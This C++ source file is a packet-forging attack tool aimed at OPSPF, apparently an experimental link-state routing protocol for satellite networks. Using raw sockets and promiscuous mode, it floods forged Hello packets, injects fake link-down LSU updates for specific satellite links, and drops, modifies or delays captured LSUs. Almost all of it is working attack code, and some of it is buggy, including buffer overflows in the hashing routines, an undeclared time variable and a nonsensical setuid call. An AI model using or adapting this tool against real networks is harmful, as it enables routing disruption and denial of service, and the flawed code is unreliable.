#include <unistd.h>
#include <stdio.h>
#include <sys/fcntl.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <memory.h>
#include <stdlib.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h> // sockaddr_ll
#include<arpa/inet.h>
#include<netinet/if_ether.h>
#include <net/if.h>
#include<iomanip>

#include <sys/ioctl.h>
#include <cstring>
#include <fstream>
#include <iostream>
#include <pthread.h>
#include <string.h>
#include <cmath>

#include <openssl/sha.h>

#include "attackSocket.h"
#include "shell.h"

using namespace std;

OpspfInfData selfInf;

OpspfLsuInfo lsuData;

OpspfLsuackInfo lsuackData;

OpspfHelloInfo helloData;

int satelliteId,satelliteId_opposite,attackMode;

int key_value = 1;

int main(int argc,char* argv[])
{
	if(argc!=3)
	{
		cout<<"Wrong parameter number !"<<endl;
		return 0;
	}
	satelliteId = atoi(argv[1]);
	satelliteId_opposite = satelliteId -1;
	initialize(satelliteId);
	attackMode = atoi(argv[2]);

	switch(attackMode)
	{
		case SEND_FAKE_HELLO_PACKET:
		{
			Send_FakeHello_Packet();
			break;
		}
		case SEND_FAKE_LSU_PACKET :
		{
			Send_FakeLsu_Packet();
			break;
		}
		default:
		{
			pthread_t recv;
			pthread_create(&recv,NULL,recv_opspf, NULL);
			pthread_join(recv,NULL);
			break;
		}
		
	}
	return 0;
}

void initialize(int satelliteId)
{
    selfInf =interface_init(satelliteId,100); 
	selfInf.changeStat = OPSPF_PORT_NOCHANGE; 
	selfInf.stat = true;   
	selfInf.ttl = OPSPF_PORT_TTL;   
	selfInf.lsuAck = false;
	cout<<"Initialized finished!"<<endl;
}


OpspfInfData interface_init(int satelliteId,int portId)
{
	int sd; 
	int  one = 1;
	const int *val = &one;
	int ret;
	char dev[BUF_STR_SIZE];
	sprintf(dev,"attack%dp%d",satelliteId,portId);
	struct ifreq interface;
	OpspfInfData inf;
	int if_index;
	unsigned char if_mac[6];

	//sd = socket(AF_INET, SOCK_RAW, IPPROTO_OPSPF);
	sd = socket(PF_PACKET, SOCK_RAW, htons(ETHERTYPE_IP));
	//sd = socket(AF_INET,SOCK_DGRAM,0);
	if (sd < 0)
	{
		perror("socket() error");
		// If something wrong just exit
		exit(-1);
	}


	strncpy(interface.ifr_name,dev,sizeof(dev));

	ret = ioctl(sd,SIOCGIFINDEX,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not get index"<<endl;
	}

	ret = ioctl(sd,SIOCGIFHWADDR,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not get HWADDR"<<endl;
	}

	ret = ioctl(sd,SIOCGIFFLAGS,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not do ioctl"<<endl;
	}

	interface.ifr_flags |= IFF_PROMISC;
	ret = ioctl(sd,SIOCSIFFLAGS,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not set to promisc mode"<<endl;
	}

	memcpy(if_mac,interface.ifr_hwaddr.sa_data,sizeof(if_mac));
	memcpy(inf.if_mac ,if_mac,sizeof(if_mac));

	ret = ioctl(sd,SIOCGIFINDEX,(char*)&interface);
	if(ret<0)
	{
		close(sd);
		//cout<<"Can not get index"<<endl;
	}
	if_index = interface.ifr_ifindex;

	struct sockaddr_in addr,netmask;
	ret=ioctl(sd,SIOCGIFADDR,(char*)&interface);
	if(ret<0)
	{
		//cout<<"Can not get IP"<<endl;
	}
	inf.ip = ((struct sockaddr_in *)&interface.ifr_addr)->sin_addr.s_addr;

	//cout<<inf.ip<<endl;

	ret=ioctl(sd,SIOCGIFNETMASK,(char*)&interface);
	if(ret<0)
	{
		//cout<<"Can not get netmask"<<endl;
	}
	 inf.netmask = ((struct sockaddr_in *)&interface.ifr_netmask)->sin_addr.s_addr;

	 inf.sock = sd;
	 inf.if_index = if_index;
	 inf.satelliteId = satelliteId;
	 inf.portId = portId;
	if(setsockopt(sd,SOL_SOCKET,SO_BINDTODEVICE,(char*)&interface,sizeof(struct ifreq))<0)
	{
		//perror("SO_BINDTODEVICE failed");
	}


	// if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(int)))
	// {
	// 	perror("setsockopt() error");
	// 	exit(-1);
	// }
	else
		//printf("setsockopt() is OK.\n");

	 return inf;
}

void OpspfSendProtocolPacket(OpspfInfData inf,OpspfPacketType packetType)
{
	char buffer[PCKT_LEN] ;
	int count = 0;
	struct ethhdr *eth_header = (struct ethhdr *)buffer;
	struct iphdr *ip = (struct iphdr *) (buffer+sizeof(struct ethhdr));
	OPSPF_Header* opspf_header =(OPSPF_Header*)(buffer +sizeof(struct ethhdr)+ sizeof(struct iphdr));
	char *key_hash =new char;
	sprintf(key_hash,"%d",key_value);
	char text[256];
	string hashstr,temp;

	//缓存清零
	memset(buffer, 0, PCKT_LEN);

	switch(packetType)
	{
		case OPSPF_HELLO_PACKET:
		{		
			opspf_header->packetType = OPSPF_HELLO_PACKET;
			opspf_header->pktlen = sizeof(OPSPF_Header)+sizeof(OpspfHelloInfo);
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr) ,opspf_header , sizeof(OPSPF_Header));

			OpspfHelloInfo* helloInfo = (OpspfHelloInfo*)(buffer+sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
			helloInfo->satelliteId = inf.satelliteId;
			helloInfo->portId =inf.portId;
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr)+sizeof(OPSPF_Header),helloInfo, sizeof(OpspfHelloInfo));

		

			//memcpy(text,helloInfo,sizeof(OpspfHelloInfo));
			
			memcpy(text,key_hash,sizeof(KEY_BUFFER_SIZE));
			
			temp = text;

			hashstr = sha256_hash(temp);
			//cout<<hashstr<<endl;
			HASH* hashInfo = (HASH*)(buffer+sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header)+sizeof(OpspfHelloInfo));
			strcpy(hashInfo->hash_value,hashstr.c_str()); 


			break;
		}
		case OPSPF_LSU_PACKET:
		{
			opspf_header->packetType = OPSPF_LSU_PACKET;
			opspf_header->pktlen = sizeof(OPSPF_Header)+sizeof(OpspfLsuInfo);
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr) ,opspf_header , sizeof(OPSPF_Header));

			OpspfLsuInfo* lsuInfo = (OpspfLsuInfo*)(buffer+sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
			*lsuInfo  = lsuData;
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr)+sizeof(OPSPF_Header),lsuInfo , sizeof(OpspfLsuInfo));

			//HASH
			//memcpy(text,lsuInfo,sizeof(OpspfLsuInfo));
			memcpy(text,key_hash,sizeof(KEY_BUFFER_SIZE));
			temp = text;
			hashstr = sha256_hash(temp);
			cout<<hashstr<<endl;
			HASH* hashInfo = (HASH*)(buffer+sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header)+sizeof(OpspfLsuInfo));
			strcpy(hashInfo->hash_value,hashstr.c_str()); 
			break;
		}
		case OPSPF_LSACK_PACKET:
		{
			opspf_header->packetType = OPSPF_LSACK_PACKET;
			opspf_header->pktlen = sizeof(OPSPF_Header)+sizeof(OpspfLsuackInfo);
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr) ,opspf_header , sizeof(OPSPF_Header));

			OpspfLsuackInfo* lsuackInfo = (OpspfLsuackInfo*)(buffer+sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
			
			*lsuackInfo = lsuackData;
			memcpy(buffer +sizeof(struct ethhdr)+ sizeof(iphdr)+sizeof(OPSPF_Header),lsuackInfo , sizeof(OpspfLsuackInfo));
			
			//HASH
			//memcpy(text,lsuackInfo,sizeof(OpspfLsuackInfo));
			memcpy(text,key_hash,sizeof(KEY_BUFFER_SIZE));
			temp = text;
			hashstr = sha256_hash(temp);
			cout<<hashstr<<endl;
			HASH* hashInfo = (HASH*)(buffer+sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header)+sizeof(OpspfLsuackInfo));
			strcpy(hashInfo->hash_value,hashstr.c_str()); 
			break;
		}
		default:
		{
			cout<<"Unknown protocol packet type to send!"<<endl;
			break;
		}
	}

	struct sockaddr_in sin, din;
	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;
	sin.sin_addr.s_addr = inf.ip;
	din.sin_addr.s_addr = inf.ip;

 
	// Fabricate the IP header or we can use the
	// standard header structures but assign our own values.
	ip->ihl = COMMON_IPHDR_LEN;
	ip->version = IP_VERSION;//报头长度，4*32=128bit=16B
	ip->tos = DEFAULT_OPSPF_TOS; // 服务类型
	ip->tot_len = (sizeof(struct iphdr) + opspf_header->pktlen);
	//ip->id = htons(54321);//可以不写
	ip->ttl = DEFAULT_OPSPF_TTL; // hops生存周期
	ip->protocol = IPPROTO_OPSPF; // OPSPF
	ip->check = 0;

	ip->saddr = sin.sin_addr.s_addr;
	ip->daddr = din.sin_addr.s_addr;

	struct sockaddr_ll dstmac;
	memset(&dstmac,0,sizeof(dstmac));
	dstmac.sll_family = AF_PACKET;
	dstmac.sll_ifindex = inf.if_index;
	dstmac.sll_halen = htons(ETH_HLEN);
	memcpy(dstmac.sll_addr,inf.if_mac,dstmac.sll_halen);
	memcpy(eth_header->h_dest , inf.if_mac,ETH_ALEN);
 
	setuid(getpid());//如果不是root用户，需要获取权限	
		
	if (sendto(inf.sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&dstmac, sizeof(dstmac)) < 0)
		// Verify
	//if (sendto(inf.sock, buffer, ip->tot_len, 0, (struct sockaddr *)&din, sizeof(din)) < 0)	
	{
		perror("sendto() error");
	}	
		//close(inf.sock);
}

void *recv_opspf(void *ptr)
{
	int sockfd;
	struct iphdr *ip;
	struct ethhdr *eth_header;
	char buf[2048];
	ssize_t n;
	int interfaceIndex;

	if ((sockfd = socket(PF_PACKET,  SOCK_RAW, htons(ETH_P_ALL)))== -1)
	{    
	    printf("socket error!\n");
	}

	while(1)
	{
		 n = recv(sockfd, buf, sizeof(buf), 0);
	    if (n == -1)
	    {
	        printf("recv error!\n");
	        break;
	    }
	    else if (n==0)
	        continue;
	    eth_header = (struct ethhdr*)(buf);
	    ip = ( struct iphdr *)(buf+sizeof(ethhdr));
	    // route_test();
	    if(ip->protocol != IPPROTO_OPSPF )
	    {
	    	continue;
	    }

        if (ip->protocol == IPPROTO_OPSPF && ip->saddr !=selfInf.ip)
        {
            OPSPF_Header *opspfhdr = (OPSPF_Header *)(buf +sizeof(ethhdr)+sizeof(struct iphdr));
            //analyseOPSPF(opspfhdr);
            switch(opspfhdr->packetType)
            {
                case OPSPF_HELLO_PACKET:
                  {
                    OpspfHelloInfo *helloInfo =(OpspfHelloInfo*)(buf +sizeof(ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));

                    if(attackMode == DROP_HELLO_PACKET)
                    {
                    	break;
                    }
                    else
                    {
                    	Opspf_Handle_HelloPacket(helloInfo);
                    }
                    break;
                  }
                case OPSPF_LSU_PACKET:
                {
                    OpspfLsuInfo *lsuInfo =(OpspfLsuInfo*)(buf +sizeof(ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
                    // receive_satelliteId = lsuInfo->satelliteId;
                    // receive_portId = lsuInfo->portId;
                    cout<<"receive_LSU_packet"<<endl;
                    if(attackMode == MODIFY_LSU_PACKET)
                    {
                    	Opspf_Modify_LsuPacket(lsuInfo);
                    }
                    else if(attackMode == DELAY_LSU_PACKET)
                    {
                    	Opspf_Delay_LsuPacket(lsuInfo);
                    }
                    // else if(attackMode == SEND_FAKE_LSACK_PACKET)
                    // {
                    // 	Send_FakeLsack_Packet();
                    // }
                    break; 
                }
                // case OPSPF_LSACK_PACKET:
                // {
                // 	OpspfLsuackInfo *lsuackInfo =(OpspfLsuackInfo*)(buf +sizeof(ethhdr)+sizeof(struct iphdr)+sizeof(OPSPF_Header));
                //     Opspf_Modify_LsuackPacket(lsuackInfo);
                //     break; 
                // }

                default:
                    break;
            }
        }  
 			  
	}
	close(sockfd);
    
}

void analyseIP(struct iphdr *ip)
{
    unsigned char* p = (unsigned char*)&ip->saddr;
    printf("Source IP\t: %u.%u.%u.%u\n",p[0],p[1],p[2],p[3]);
}

void Opspf_Handle_HelloPacket(const OpspfHelloInfo* helloInfo)
{

   cout<<"HelloPacket"+to_string(helloInfo->satelliteId)+ to_string(helloInfo->portId)<<endl;
  if(attackMode == DROP_HELLO_PACKET)return;
   //OpspfSendProtocolPacket(selfInf,OPSPF_HELLO_PACKET);

}

void Opspf_Modify_LsuPacket(const OpspfLsuInfo* lsuInfo)
{
  
    int srcSatelliteId = lsuInfo->srcSatelliteId;
    int srcPortId = lsuInfo->srcPortId;
    int dstSatelliteId = lsuInfo->dstSatelliteId;
    int dstPortId = lsuInfo->dstPortId;
    int stat =lsuInfo->changeStat;
	

    // lsuData = *lsuInfo;
    // lsuData.changeStat = OPSPF_PORT_LINKDOWN;
	int lsuId = 1;
	lsuData.lsuType = 2;
	lsuData.lsuId = lsuId;

    
    if(satelliteId == 2)
	{
		//if(stat == OPSPF_PORT_RELINK)return;
	    lsuData.srcSatelliteId = 3;
	    lsuData.srcPortId = 0;
	    lsuData.dstSatelliteId = 2;
	    lsuData.dstPortId = 1;
		lsuData.changeStat = OPSPF_PORT_LINKDOWN;

		
	}

	else if(satelliteId == 4)
	{
		lsuData.srcSatelliteId = 5;
	    lsuData.srcPortId = 0;
	    lsuData.dstSatelliteId = 4;
	    lsuData.dstPortId = 1;
		lsuData.changeStat = OPSPF_PORT_LINKDOWN;
	}

	else if(satelliteId == 6)
	{
		lsuData.srcSatelliteId = 7;
	    lsuData.srcPortId = 0;
	    lsuData.dstSatelliteId = 6;
	    lsuData.dstPortId = 1;
		lsuData.changeStat = OPSPF_PORT_LINKDOWN;
		// lsuData.changeStat = OPSPF_PORT_RELINK;	
		// sleep(7);
	}

	else if(satelliteId == 7)
	{
		lsuData.srcSatelliteId = 8;
	    lsuData.srcPortId = 1;
	    lsuData.dstSatelliteId = 7;
	    lsuData.dstPortId = 1;
		lsuData.changeStat = OPSPF_PORT_LINKDOWN;
	}

    lsuData.timeStamp = GetTime();
    sleep(50);
    cout<<"Send MODIFY_LSU_PACKET !"<<endl;
    cout<<"LsuPacket"+to_string(lsuData.srcSatelliteId)+to_string(lsuData.srcPortId)+to_string(lsuData.changeStat)<<endl;
    OpspfSendProtocolPacket(selfInf,OPSPF_LSU_PACKET);
    

}

void Opspf_Delay_LsuPacket(const OpspfLsuInfo* lsuInfo)
{
	lsuData = *lsuInfo;
	cout<<"LsuPacket"+to_string(lsuData.srcSatelliteId)+to_string(lsuData.srcPortId)+to_string(lsuData.changeStat)<<endl;
	sleep(100);
	lsuData.timeStamp = GetTime();
    cout<<"Send DELAY_LSU_PACKET !"<<endl;
    
    OpspfSendProtocolPacket(selfInf,OPSPF_LSU_PACKET);
}

// void Opspf_Modify_LsuackPacket(const OpspfLsuackInfo* lsuackInfo)
// {
//     cout<<"ACKPacket"+to_string(lsuackInfo->ackId)<<endl;
// 	lsuackData.ackId = lsuackInfo->ackId + 1;
// 	OpspfSendProtocolPacket(selfInf,OPSPF_LSACK_PACKET);
   
// }

void Send_FakeHello_Packet()
{
	for(int i = 0; i<1000; i++)
	{
		OpspfSendProtocolPacket(selfInf,OPSPF_HELLO_PACKET);
		cout<<"Send Fake HelloPacket !"<<endl;
		sleep(OPSPF_HELLO_INTERVAL);
	}

}

void Send_FakeLsu_Packet()
{
	int lsuId = 1;
	lsuData.lsuType = 2;
	lsuData.lsuId = lsuId;
    lsuData.srcSatelliteId = 3;
    lsuData.srcPortId = 1;
    lsuData.dstSatelliteId = 4;
    lsuData.dstPortId = 0;
    lsuData.max_distance = 1;
    lsuData.changeStat = OPSPF_PORT_LINKDOWN;
    lsuData.timeStamp = GetTime();
	for (int i = 0; i < 100; ++i)
	{
		lsuData.lsuId++;
		OpspfSendProtocolPacket(selfInf,OPSPF_LSU_PACKET);
		cout<<"Send Fake LSUPacket !"<<endl;
		sleep(OPSPF_LSU_INTERVAL);
	}

}

// void Send_FakeLsack_Packet()
// {
// 	lsuackData.ackId = 1;
// 	for (int i = 0; i < 100; ++i)
// 	{
// 		  OpspfSendProtocolPacket(selfInf,OPSPF_LSACK_PACKET);
// 		  sleep(OPSPF_HELLO_INTERVAL);
// 	}

// }

int GetTime()
{
    return tv.tv_sec + tv.tv_usec/1000;
}

string sha256_hash(const string str)
{
	char buf[2];
	unsigned char hash[SHA256_DIGEST_LENGTH];
	SHA256_CTX sha256;
	SHA256_Init(&sha256);
	SHA256_Update(&sha256,str.c_str(),str.size());
	SHA256_Final(hash,&sha256);
	std::string newString ="";
	for (int i = 0; i < SHA256_DIGEST_LENGTH; ++i)
	{
		sprintf(buf,"%02x",hash[i]);
		newString = newString+buf;
	}
	return newString;
}
